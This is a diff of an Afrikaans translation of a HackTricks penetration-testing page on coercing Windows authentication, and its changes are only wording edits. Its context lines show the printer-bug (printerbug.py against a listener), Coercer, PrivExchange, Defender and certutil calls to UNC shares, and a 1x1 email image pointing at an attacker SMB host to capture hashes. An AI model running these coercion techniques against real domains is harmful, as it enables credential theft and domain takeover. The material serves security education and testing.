@@ -26,13 +26,13 @@ Let daarop dat wanneer die drukker die kennisgewing na 'n arbitrêre stelsel stu
 
 ### Finding Windows Servers on the domain
 
-Gebruik PowerShell om 'n lys van Windows-bokse te kry. Bedieners is gewoonlik prioriteit, so kom ons fokus daar:
+Gebruik PowerShell om 'n lys van Windows bokse te kry. Bedieners is gewoonlik prioriteit, so kom ons fokus daar:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Finding Spooler services listening
+### Vind Spooler dienste wat luister
 
-Gebruik 'n effens aangepaste @mysmartlogin se (Vincent Le Toux se) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), kyk of die Spooler-diens luister:
+Gebruik 'n effens aangepaste @mysmartlogin se (Vincent Le Toux se) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), kyk of die Spooler Diens luister:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -54,9 +54,9 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Kombinasie met Onbeperkte Delegasie
 
-As 'n aanvaller reeds 'n rekenaar met [Onbeperkte Delegasie](unconstrained-delegation.md) gecompromitteer het, kan die aanvaller **die drukker laat outentiseer teen hierdie rekenaar**. As gevolg van die onbeperkte delegasie, sal die **TGT** van die **rekenaarrekening van die drukker** **in** die **geheue** van die rekenaar met onbeperkte delegasie **gestoor word**. Aangesien die aanvaller hierdie gasheer reeds gecompromitteer het, sal hy in staat wees om **hierdie kaartjie te onttrek** en dit te misbruik ([Pass the Ticket](pass-the-ticket.md)).
+As 'n aanvaller reeds 'n rekenaar met [Onbeperkte Delegasie](unconstrained-delegation.md) gekompromitteer het, kan die aanvaller **die drukker laat outentiseer teen hierdie rekenaar**. As gevolg van die onbeperkte delegasie, sal die **TGT** van die **rekenaarrekening van die drukker** **in** die **geheue** van die rekenaar met onbeperkte delegasie **gestoor word**. Aangesien die aanvaller hierdie gasheer reeds gekompromitteer het, sal hy in staat wees om **hierdie kaartjie te onttrek** en dit te misbruik ([Pass the Ticket](pass-the-ticket.md)).
 
-## RCP Force outentisering
+## RCP Dwing outentisering
 
 {% embed url="https://github.com/p0dalirius/Coercer" %}
 
@@ -64,11 +64,11 @@ As 'n aanvaller reeds 'n rekenaar met [Onbeperkte Delegasie](unconstrained-deleg
 
 Die `PrivExchange` aanval is 'n gevolg van 'n fout wat in die **Exchange Server `PushSubscription` kenmerk** gevind is. Hierdie kenmerk laat die Exchange-server toe om deur enige domein gebruiker met 'n posbus gedwing te word om aan enige kliënt-gelewerde gasheer oor HTTP te outentiseer.
 
-Standaard loop die **Exchange diens as SYSTEM** en word dit oorgenoeg bevoegdhede gegee (specifiek, dit het **WriteDacl bevoegdhede op die domein voor-2019 Kumulatiewe Opdatering**). Hierdie fout kan misbruik word om die **oorplasing van inligting na LDAP moontlik te maak en gevolglik die domein NTDS databasis te onttrek**. In gevalle waar oorplasing na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om oor te plaas en aan ander gasheer binne die domein te outentiseer. Die suksesvolle misbruik van hierdie aanval bied onmiddellike toegang tot die Domein Admin met enige geoutentiseerde domein gebruiker rekening.
+Standaard, die **Exchange diens loop as SYSTEM** en word oorgenoeg bevoegdhede gegee (specifiek, dit het **WriteDacl bevoegdhede op die domein voor-2019 Kumulatiewe Opdatering**). Hierdie fout kan misbruik word om die **oorplasing van inligting na LDAP moontlik te maak en gevolglik die domein NTDS databasis te onttrek**. In gevalle waar oorplasing na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om oor te plaas en aan ander gashere binne die domein te outentiseer. Die suksesvolle misbruik van hierdie aanval bied onmiddellike toegang tot die Domein Admin met enige geoutentiseerde domein gebruiker rekening.
 
 ## Binne Windows
 
-As jy reeds binne die Windows masjien is, kan jy Windows dwing om met 'n bediener te verbind deur gebruik te maak van bevoorregte rekeninge met:
+As jy reeds binne die Windows masjien is, kan jy Windows dwing om met 'n bediener te verbind met behulp van bevoegde rekeninge met:
 
 ### Defender MpCmdRun
 ```bash
@@ -101,7 +101,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Deur e-pos
 
-As jy die **e-posadres** van die gebruiker wat binne 'n masjien aanmeld wat jy wil kompromitteer, ken, kan jy hom eenvoudig 'n **e-pos met 'n 1x1 beeld** soos stuur
+As jy die **e-posadres** van die gebruiker wat binne 'n masjien aanmeld wat jy wil kompromitteer, ken, kan jy net vir hom 'n **e-pos met 'n 1x1 beeld** stuur soos
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -126,7 +126,7 @@ Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
